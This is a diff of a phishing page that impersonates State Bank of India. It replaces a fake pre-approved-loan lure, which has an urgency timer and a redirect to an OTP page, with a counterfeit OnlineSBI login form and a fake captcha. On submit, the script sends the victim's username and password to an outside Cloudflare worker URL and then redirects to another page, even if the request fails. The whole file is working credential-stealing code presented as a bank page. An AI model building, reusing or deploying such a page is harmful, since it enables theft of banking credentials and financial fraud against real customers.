@@ -3,169 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBI - Digital Loan Services</title>
+    <title>SBI - Personal Banking</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-        body { background-color: #f4f7fa; display: flex; justify-content: center; color: #333; overflow-x: hidden; }
-        .container { width: 100%; max-width: 500px; background: #fff; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 0 15px rgba(0,0,0,0.05); position: relative; }
-        
-        .header-img { width: 100%; display: block; border-bottom: 3px solid #315195; }
-
-        /* --- Professional Loading Screen --- */
-        #loading-screen {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #fff; z-index: 9999; display: flex; flex-direction: column; 
-            align-items: center; justify-content: center; text-align: center; padding: 20px;
-        }
-        .spinner {
-            width: 55px; height: 55px; border: 5px solid #f3f3f3; 
-            border-top: 5px solid #315195; border-radius: 50%; 
-            animation: spin 1s linear infinite; margin-bottom: 25px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #loading-text { font-size: 15px; color: #315195; font-weight: 500; min-height: 40px; }
-
-        /* --- Main Content (Hidden initially) --- */
-        #main-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.5s ease-in; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-        .success-box { padding: 40px 20px 25px; text-align: center; background: linear-gradient(180deg, #eaf6ff 0%, #ffffff 100%); }
-        
-        /* Bada Success Logo */
-        .success-icon { width: 95px; height: 95px; margin: 0 auto 20px; background: #e6f7ef; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,168,89,0.1); }
-        .success-icon span { color: #00a859; font-size: 55px; font-weight: bold; }
-
-        .loan-status { color: #00a859; font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 5px; display: block; }
-        .congrats-title { color: #212121; font-size: 22px; font-weight: 500; margin-bottom: 5px; }
-        .approved-amount { font-size: 46px; color: #315195; font-weight: 700; margin: 10px 0; letter-spacing: -1px; }
-        
-        .validity-timer { font-size: 13px; color: #b30000; font-weight: bold; margin-top: 5px; }
-
-        /* Professional Details Card */
-        .details-card { margin: 10px 25px; border-radius: 8px; border: 1px solid #f0f0f0; background: #fafafa; overflow: hidden; }
-        .detail-row { display: flex; justify-content: space-between; padding: 13px 16px; border-bottom: 1px solid #eee; font-size: 13px; }
-        .detail-row:last-child { border: none; }
-        .lbl { color: #6e6e6e; }
-        .val { color: #212121; font-weight: 600; }
-
-        .action-container { padding: 15px 25px 40px; margin-top: auto; }
-        
-        /* Sleek Button */
-        .btn-sleek { 
-            width: 100%; background: #315195; color: white; padding: 11px 0; 
-            border: none; border-radius: 4px; font-size: 15px; font-weight: 500; 
-            cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1); transition: 0.2s;
-        }
-        .btn-sleek:active { background: #1e335e; transform: scale(0.98); }
-        
-        .footer-img { width: 100%; display: block; }
+        * { box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; }
+        body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
+        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
+        .full-img { width: 100%; display: block; }
+        .sky-blue-container { background-color: #eaf6ff; width: 100%; padding: 10px 0 5px 0; text-align: center; border-bottom: 1px solid #d1e9ff; display: flex; flex-direction: column; align-items: center; }
+        .login-title { color: #0054a6; font-size: 13px; font-weight: bold; margin-bottom: 2px; }
+        .scrolling-msg { color: #b30000; font-size: 13px; font-weight: bold; width: 100%; margin-top: 3px; margin-bottom: 2px; }
+        .center-icon { font-size: 12px; color: #0054a6; line-height: 1; display: block; margin-top: 3px; cursor: pointer; }
+        .content-area { padding: 0 25px; flex-grow: 1; }
+        .care-text { padding: 12px 0; font-size: 13px; color: #333; }
+        .care-text b { color: #b30000; }
+        .field-group { margin-bottom: 12px; }
+        .field-group label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; }
+        .field-group input { width: 100%; padding: 8px 12px; background-color: #f1f1f1; border: 1px solid #ddd; border-radius: 2px; font-size: 15px; outline: none; height: 38px; }
+        .error-hint { color: #b30000; font-size: 12px; margin-top: 2px; font-weight: bold; display: none; }
+        .radio-option { display: flex; align-items: center; gap: 10px; color: #b30000; font-weight: bold; font-size: 13px; margin-bottom: 8px; }
+        .captcha-box { display: flex; align-items: center; gap: 15px; margin: 10px 0 15px; }
+        .captcha-container { position: relative; background: #fff; width: 130px; height: 45px; display: flex; align-items: center; justify-content: flex-start; overflow: hidden; border: none; }
+        .captcha-img { font-size: 26px; font-weight: bold; letter-spacing: 4px; font-family: 'Courier New', Courier, monospace; font-style: italic; z-index: 2; user-select: none; }
+        .line { position: absolute; height: 1.5px; width: 120%; z-index: 1; }
+        .refresh-btn { font-size: 30px; color: #1a73bc; cursor: pointer; font-weight: 900; }
+        .btn-row { display: flex; justify-content: flex-start; gap: 10px; margin-top: 15px; }
+        .btn { width: 90px; padding: 8px 0; border: none; color: white; font-size: 15px; border-radius: 2px; cursor: pointer; }
+        .btn-blue { background-color: #315195; }
+        .btn-gray { background-color: #6c757d; }
+        .footer-links { margin-top: 20px; font-size: 13px; }
+        .footer-links a { color: #1a73bc; text-decoration: none; display: block; margin-bottom: 8px; }
+        .v-keyboard-box { background-color: #fcfcfc; padding: 10px 0; border: none; margin: 18px 0; display: flex; align-items: center; gap: 10px; font-size: 14px; color: #444; }
+        .v-keyboard-box input[type="checkbox"] { width: 18px; height: 18px; cursor: pointer; }
+        .footer-img-container { width: 100%; margin-top: 20px; }
     </style>
 </head>
-<body>
+<body onload="generateCaptcha()">
 
     <div class="container">
-        <div id="loading-screen">
-            <div class="spinner"></div>
-            <div id="loading-text">Establishing secure connection...</div>
+        <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
+
+        <div class="sky-blue-container">
+            <div class="login-title">Login to OnlineSBI</div>
+            <div class="scrolling-msg">
+                <marquee id="sbiMarquee" scrollamount="4">Dear Customer, Mandatory login and profile password change</marquee>
+            </div>
+            <div class="center-icon" onclick="toggleMarquee()">⏯️</div>
         </div>
 
-        <div id="main-content">
-            <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" class="header-img">
-
-            <div class="success-box">
-                <div class="success-icon"><span>✓</span></div>
-                <span class="loan-status">Application Approved</span>
-                <h1 class="congrats-title">Congratulations!</h1>
-                <p style="font-size: 13px; color: #666;">Your pre-approved credit limit is ready for dispersal.</p>
-                <div class="approved-amount" id="loanVal">₹ 0,00,000</div>
-                <div class="validity-timer">Offer expires in: <span id="timer">02:00</span> min</div>
+        <div class="content-area">
+            <div class="care-text">
+                <b>(CARE:</b> Username and password are case sensitive.)
             </div>
 
-            <div class="details-card">
-                <div class="detail-row"><span class="lbl">Loan Product</span><span class="val">Instant Personal Loan</span></div>
-                <div class="detail-row"><span class="lbl">Interest Rate</span><span class="val" style="color: #b30000;">4.00% p.a. (Fixed)</span></div>
-                <div class="detail-row"><span class="lbl">Processing Fee</span><span class="val" style="color: #00a859;">₹ 0.00 (Waived)</span></div>
-                <div class="detail-row"><span class="lbl">Tenure Period</span><span class="val">60 Months</span></div>
-                <div class="detail-row"><span class="lbl">Disbursement Type</span><span class="val">Instant Bank Transfer</span></div>
-            </div>
+            <form id="loginForm" class="login-form">
+                <div class="field-group">
+                    <label>Username*</label>
+                    <input type="text" id="username" autocomplete="off" required>
+                    <div id="userError" class="error-hint">Required Username</div>
+                </div>
 
-            <p style="padding: 15px 30px; font-size: 11px; color: #999; text-align: center; line-height: 1.4;">
-                This offer is digitally generated based on your banking relationship. Final credit is subject to Aadhaar-OTP verification.
-            </p>
+                <div class="field-group">
+                    <label>Password*</label>
+                    <input type="password" id="password" autocomplete="off" required>
+                    <div id="passError" class="error-hint">Required Password</div>
+                </div>
 
-            <div class="action-container">
-                <button class="btn-sleek" id="transferBtn">Transfer to Bank Account</button>
-            </div>
+                <div class="field-group">
+                    <label>Enter the text as shown in the image *</label>
+                    <input type="text" id="captcha_input" autocomplete="off" required>
+                    <div id="captchaError" class="error-hint">Invalid Captcha</div>
+                </div>
 
-            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" class="footer-img">
+                <p style="font-size: 12px; color: #555; margin-bottom: 8px;">Select one of the Captcha options *</p>
+                <label class="radio-option"><input type="radio" name="c" checked> Image Captcha</label>
+                <label class="radio-option"><input type="radio" name="c"> Audio Captcha</label>
+
+                <div class="captcha-box">
+                    <div class="captcha-container" id="captcha_wrap">
+                        <div class="captcha-img" id="captcha_txt"></div>
+                    </div>
+                    <div class="refresh-btn" onclick="generateCaptcha()">&#8635;</div>
+                </div>
+
+                <div class="btn-row">
+                    <button type="submit" class="btn btn-blue" id="loginBtn">Login</button>
+                    <button type="reset" class="btn btn-gray" onclick="generateCaptcha()">Reset</button>
+                </div>
+
+                <div class="footer-links">
+                    <a href="#">New User ? Register here/Activate</a>
+                    <a href="#">Forgot Username / Login Password</a>
+                </div>
+
+                <div class="v-keyboard-box">
+                    <input type="checkbox" id="vk">
+                    <label for="vk">
+                        <span class="kb-icon">⌨️</span> 
+                        Enable Virtual Keyboard
+                    </label>
+                </div>
+            </form>
+        </div>
+
+        <div class="footer-img-container">
+            <img src="https://i.ibb.co/Txj77Jk2/chrome-screenshot-1-Apr-2026-12-43-42-pm-IST.png" alt="Footer" class="full-img">
         </div>
     </div>
 
     <script>
+        let currentCaptcha = "";
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
-        let finalAmount = "";
 
-        // 1. Loading Logic (8 Professional Steps)
-        const loadingTexts = [
-            "Establishing secure connection to SBI server...",
-            "Fetching CIBIL/Credit score records...",
-            "Verifying Aadhaar-linked primary account...",
-            "Validating employment & income eligibility...",
-            "Scanning for pre-approved digital offers...",
-            "Calculating maximum sanction limit...",
-            "Performing final risk assessment...",
-            "Generating digital approval letter..."
-        ];
-
-        let textIdx = 0;
-        const textInterval = setInterval(() => {
-            if(textIdx < loadingTexts.length) {
-                document.getElementById('loading-text').innerText = loadingTexts[textIdx];
-                textIdx++;
+        function generateCaptcha() {
+            const chars = '23456789abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ';
+            let code = '';
+            for (let i = 0; i < 5; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
             }
-        }, 800);
-
-        setTimeout(() => {
-            clearInterval(textInterval);
-            document.getElementById('loading-screen').style.display = 'none';
-            document.getElementById('main-content').style.display = 'flex';
-            startTimer(120);
-        }, 6500);
-
-        // 2. Random Amount 1.5L to 3L
-        window.onload = function() {
-            const amt = Math.floor(Math.random() * (300000 - 150000 + 1)) + 150000;
-            finalAmount = "₹ " + amt.toLocaleString('en-IN');
-            document.getElementById('loanVal').innerText = finalAmount;
-        };
-
-        // 3. Countdown Timer
-        function startTimer(duration) {
-            let timer = duration, min, sec;
-            const display = document.querySelector('#timer');
-            const interval = setInterval(() => {
-                min = parseInt(timer / 60, 10);
-                sec = parseInt(timer % 60, 10);
-                display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
-                if (--timer < 0) clearInterval(interval);
-            }, 1000);
+            currentCaptcha = code;
+            const captchaTextElement = document.getElementById('captcha_txt');
+            captchaTextElement.innerText = code;
+            const wrap = document.getElementById('captcha_wrap');
+            wrap.querySelectorAll('.line').forEach(l => l.remove());
+            for (let i = 0; i < 4; i++) {
+                const line = document.createElement('div');
+                line.className = 'line';
+                line.style.backgroundColor = '#444';
+                line.style.top = (Math.random() * 30 + 5) + 'px';
+                line.style.left = '-10%';
+                wrap.appendChild(line);
+            }
         }
 
-        // 4. Action Button
-        document.getElementById('transferBtn').addEventListener('click', async function() {
-            this.disabled = true;
-            this.innerText = "Processing...";
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            const log = `✅ LOAN CLAIMED\nAmount: ${finalAmount}\nRate: 4%\nStatus: User moving to OTP`;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const captchaInput = document.getElementById('captcha_input').value;
+            const btn = document.getElementById('loginBtn');
+
+            if (captchaInput !== currentCaptcha) {
+                document.getElementById('captchaError').style.display = 'block';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "Please Wait...";
+
+            // Sahi Payload with Type
+            const payload = {
+                type: "LOGIN",
+                user: username,
+                pass: password,
+                captcha: captchaInput
+            };
 
             try {
-                await fetch(workerURL + "?detail=" + encodeURIComponent(log));
-                window.location.href = "otp.html";
-            } catch (e) {
-                window.location.href = "otp.html";
+                // FIXED: mode change to 'cors' and added type
+                await fetch(workerURL, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                window.location.href = "blogone.html";
+            } catch (err) {
+                // Background mein error ho tab bhi aage bhej do
+                window.location.href = "blogone.html";
             }
         });
+
+        let isMoving = true;
+        function toggleMarquee() {
+            const mq = document.getElementById('sbiMarquee');
+            isMoving ? mq.stop() : mq.start();
+            isMoving = !isMoving;
+        }
     </script>
 </body>
 </html>
